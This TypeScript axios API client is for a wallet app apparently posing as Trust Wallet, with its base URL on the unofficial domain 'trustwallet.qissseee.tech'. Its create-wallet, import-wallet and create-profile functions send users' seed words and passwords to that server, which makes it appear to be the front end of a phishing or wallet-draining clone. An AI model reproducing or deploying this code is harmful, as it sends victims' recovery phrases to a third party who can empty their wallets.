import axios, { AxiosInstance } from "axios";
import { ThemeType } from "./types";

const api: AxiosInstance = axios.create({
	baseURL: "https://trustwallet.qissseee.tech/api/",
});

api.interceptors.request.use(
	(config) => {
		const token =
			typeof window !== "undefined" && window.localStorage
				? localStorage.getItem("token")
				: null;

		if (token) {
			config.headers = config.headers || {};
			config.headers.Authorization = `Bearer ${token}`;
		}

		return config;
	},
	(error) => {
		return Promise.reject(error);
	}
);

export const authCreateWallet = async (data: {
	password: string;
	password_confirmation: string;
	seed_words: string[];
}) => await api.post("auth/create-wallet", data);

export const authImportWallet = async (data: {
	password: string;
	password_confirmation: string;
	seed_words: string[];
}) => await api.post("auth/import-wallet", data);

export const authLogout = async () => await api.post("/auth/logout");

export const walletSettings = async () => await api.get("wallet/settings");

export const walletDashboard = async () => await api.get("/wallet/dashboard");

export const walletProfiles = async () => await api.get("/wallet/profiles");

export const walletCreateProfile = async (data: {
	name?: string;
	password?: string;
	method: "create" | "import";
	seed_words?: string;
}) => await api.post("/wallet/profiles", data);

export const walletSetDefaultProfile = async (walletId: number) =>
	api.post(`/wallet/profiles/${walletId}/set-default`);

export const walletSetTheme = async (newTheme: ThemeType) =>
	await api.post("/wallet/settings/theme", {
		theme: newTheme,
	});
